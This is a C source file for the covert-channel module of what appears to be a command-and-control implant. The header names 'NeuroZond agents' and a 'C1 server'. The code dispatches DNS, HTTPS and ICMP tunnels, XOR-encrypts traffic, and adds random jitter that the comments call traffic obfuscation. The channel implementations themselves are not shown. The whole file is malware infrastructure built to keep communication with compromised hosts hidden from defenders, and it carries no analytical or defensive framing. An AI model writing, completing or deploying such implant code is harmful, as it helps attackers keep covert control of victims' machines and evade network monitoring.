/**
 * @file covert_channel.c
 * @brief Implementation of the covert channel communication module
 * @author iamtomasanderson@gmail.com
 * @date 2023-08-15
 *
 * This module provides functionality for establishing and managing covert
 * communication channels between NeuroZond agents and the C1 server.
 */

#include "covert_channel.h"
#include <stdlib.h>
#include <string.h>
#include <time.h>

// Function pointers for different channel types
static covert_channel_init_func channel_init_funcs[CHANNEL_TYPE_MAX] = {NULL};
static covert_channel_connect_func channel_connect_funcs[CHANNEL_TYPE_MAX] = {NULL};
static covert_channel_send_func channel_send_funcs[CHANNEL_TYPE_MAX] = {NULL};
static covert_channel_receive_func channel_receive_funcs[CHANNEL_TYPE_MAX] = {NULL};
static covert_channel_set_jitter_func channel_set_jitter_funcs[CHANNEL_TYPE_MAX] = {NULL};
static covert_channel_cleanup_func channel_cleanup_funcs[CHANNEL_TYPE_MAX] = {NULL};

// Forward declarations for channel initialization
extern int dns_channel_init(void** handle, const char* server_addr, void* config);
extern int dns_channel_connect(void* handle);
extern int dns_channel_send(void* handle, const uint8_t* data, size_t data_len);
extern int dns_channel_receive(void* handle, uint8_t* buffer, size_t buffer_size, size_t* bytes_received);
extern int dns_channel_set_jitter(void* handle, uint32_t min_delay_ms, uint32_t max_delay_ms);
extern int dns_channel_cleanup(void* handle);

extern int https_channel_init(void** handle, const char* server_addr, void* config);
extern int https_channel_connect(void* handle);
extern int https_channel_send(void* handle, const uint8_t* data, size_t data_len);
extern int https_channel_receive(void* handle, uint8_t* buffer, size_t buffer_size, size_t* bytes_received);
extern int https_channel_set_jitter(void* handle, uint32_t min_delay_ms, uint32_t max_delay_ms);
extern int https_channel_cleanup(void* handle);

extern int icmp_channel_init(void** handle, const char* server_addr, void* config);
extern int icmp_channel_connect(void* handle);
extern int icmp_channel_send(void* handle, const uint8_t* data, size_t data_len);
extern int icmp_channel_receive(void* handle, uint8_t* buffer, size_t buffer_size, size_t* bytes_received);
extern int icmp_channel_set_jitter(void* handle, uint32_t min_delay_ms, uint32_t max_delay_ms);
extern int icmp_channel_cleanup(void* handle);

// Initialize the covert channel module
int covert_channel_module_init(void) {
    // Register DNS channel handlers
    channel_init_funcs[CHANNEL_TYPE_DNS] = dns_channel_init;
    channel_connect_funcs[CHANNEL_TYPE_DNS] = dns_channel_connect;
    channel_send_funcs[CHANNEL_TYPE_DNS] = dns_channel_send;
    channel_receive_funcs[CHANNEL_TYPE_DNS] = dns_channel_receive;
    channel_set_jitter_funcs[CHANNEL_TYPE_DNS] = dns_channel_set_jitter;
    channel_cleanup_funcs[CHANNEL_TYPE_DNS] = dns_channel_cleanup;
    
    // Register HTTPS channel handlers
    channel_init_funcs[CHANNEL_TYPE_HTTPS] = https_channel_init;
    channel_connect_funcs[CHANNEL_TYPE_HTTPS] = https_channel_connect;
    channel_send_funcs[CHANNEL_TYPE_HTTPS] = https_channel_send;
    channel_receive_funcs[CHANNEL_TYPE_HTTPS] = https_channel_receive;
    channel_set_jitter_funcs[CHANNEL_TYPE_HTTPS] = https_channel_set_jitter;
    channel_cleanup_funcs[CHANNEL_TYPE_HTTPS] = https_channel_cleanup;
    
    // Register ICMP channel handlers
    channel_init_funcs[CHANNEL_TYPE_ICMP] = icmp_channel_init;
    channel_connect_funcs[CHANNEL_TYPE_ICMP] = icmp_channel_connect;
    channel_send_funcs[CHANNEL_TYPE_ICMP] = icmp_channel_send;
    channel_receive_funcs[CHANNEL_TYPE_ICMP] = icmp_channel_receive;
    channel_set_jitter_funcs[CHANNEL_TYPE_ICMP] = icmp_channel_set_jitter;
    channel_cleanup_funcs[CHANNEL_TYPE_ICMP] = icmp_channel_cleanup;
    
    // Initialize random seed for jitter functions
    srand((unsigned int)time(NULL));
    
    return 0;
}

int covert_channel_init(covert_channel_handle_t* handle, enum CovertChannelType channel_type, 
                        const char* server_addr, void* config) {
    if (!handle || !server_addr || channel_type >= CHANNEL_TYPE_MAX) {
        return COVERT_CHANNEL_ERROR_INVALID_PARAM;
    }
    
    // Check if the handler for this channel type is registered
    if (channel_init_funcs[channel_type] == NULL) {
        return COVERT_CHANNEL_ERROR_UNSUPPORTED_CHANNEL;
    }
    
    // Allocate memory for the handle
    *handle = (covert_channel_handle_t)malloc(sizeof(struct covert_channel_handle_s));
    if (*handle == NULL) {
        return COVERT_CHANNEL_ERROR_MEMORY;
    }
    
    // Initialize handle
    (*handle)->channel_type = channel_type;
    (*handle)->internal_handle = NULL;
    
    // Call the specific channel initialization function
    int result = channel_init_funcs[channel_type](&((*handle)->internal_handle), server_addr, config);
    if (result != 0) {
        free(*handle);
        *handle = NULL;
        return result;
    }
    
    return 0;
}

int covert_channel_connect(covert_channel_handle_t handle) {
    if (!handle || !handle->internal_handle) {
        return COVERT_CHANNEL_ERROR_INVALID_PARAM;
    }
    
    if (handle->channel_type >= CHANNEL_TYPE_MAX || channel_connect_funcs[handle->channel_type] == NULL) {
        return COVERT_CHANNEL_ERROR_UNSUPPORTED_CHANNEL;
    }
    
    return channel_connect_funcs[handle->channel_type](handle->internal_handle);
}

int covert_channel_send(covert_channel_handle_t handle, const uint8_t* data, size_t data_len) {
    if (!handle || !handle->internal_handle || !data || data_len == 0) {
        return COVERT_CHANNEL_ERROR_INVALID_PARAM;
    }
    
    if (handle->channel_type >= CHANNEL_TYPE_MAX || channel_send_funcs[handle->channel_type] == NULL) {
        return COVERT_CHANNEL_ERROR_UNSUPPORTED_CHANNEL;
    }
    
    return channel_send_funcs[handle->channel_type](handle->internal_handle, data, data_len);
}

int covert_channel_receive(covert_channel_handle_t handle, uint8_t* buffer, size_t buffer_size, 
                           size_t* bytes_received) {
    if (!handle || !handle->internal_handle || !buffer || buffer_size == 0 || !bytes_received) {
        return COVERT_CHANNEL_ERROR_INVALID_PARAM;
    }
    
    if (handle->channel_type >= CHANNEL_TYPE_MAX || channel_receive_funcs[handle->channel_type] == NULL) {
        return COVERT_CHANNEL_ERROR_UNSUPPORTED_CHANNEL;
    }
    
    return channel_receive_funcs[handle->channel_type](handle->internal_handle, buffer, buffer_size, bytes_received);
}

int covert_channel_set_jitter(covert_channel_handle_t handle, uint32_t min_delay_ms, uint32_t max_delay_ms) {
    if (!handle || !handle->internal_handle || min_delay_ms > max_delay_ms) {
        return COVERT_CHANNEL_ERROR_INVALID_PARAM;
    }
    
    if (handle->channel_type >= CHANNEL_TYPE_MAX || channel_set_jitter_funcs[handle->channel_type] == NULL) {
        return COVERT_CHANNEL_ERROR_UNSUPPORTED_CHANNEL;
    }
    
    return channel_set_jitter_funcs[handle->channel_type](handle->internal_handle, min_delay_ms, max_delay_ms);
}

int covert_channel_cleanup(covert_channel_handle_t handle) {
    if (!handle) {
        return COVERT_CHANNEL_ERROR_INVALID_PARAM;
    }
    
    int result = 0;
    
    if (handle->internal_handle && 
        handle->channel_type < CHANNEL_TYPE_MAX && 
        channel_cleanup_funcs[handle->channel_type] != NULL) {
        
        result = channel_cleanup_funcs[handle->channel_type](handle->internal_handle);
    }
    
    free(handle);
    return result;
}

// Helper function to apply XOR encryption to data
int covert_channel_encrypt_xor(uint8_t* data, size_t data_len, const uint8_t* key, size_t key_len) {
    if (!data || !key || data_len == 0 || key_len == 0) {
        return COVERT_CHANNEL_ERROR_INVALID_PARAM;
    }
    
    for (size_t i = 0; i < data_len; i++) {
        data[i] ^= key[i % key_len];
    }
    
    return 0;
}

// Helper function to decrypt XOR encrypted data
int covert_channel_decrypt_xor(uint8_t* data, size_t data_len, const uint8_t* key, size_t key_len) {
    // XOR encryption and decryption are the same operation
    return covert_channel_encrypt_xor(data, data_len, key, key_len);
}

// Helper function to apply randomized delay for traffic obfuscation
void covert_channel_apply_jitter(uint32_t min_delay_ms, uint32_t max_delay_ms) {
    if (min_delay_ms == max_delay_ms) {
        if (min_delay_ms > 0) {
            // Sleep for the exact time
#ifdef _WIN32
            Sleep(min_delay_ms);
#else
            usleep(min_delay_ms * 1000);
#endif
        }
        return;
    }
    
    // Generate random delay within the specified range
    uint32_t delay = min_delay_ms + (rand() % (max_delay_ms - min_delay_ms + 1));
    
    // Sleep for the calculated time
#ifdef _WIN32
    Sleep(delay);
#else
    usleep(delay * 1000);
#endif
} 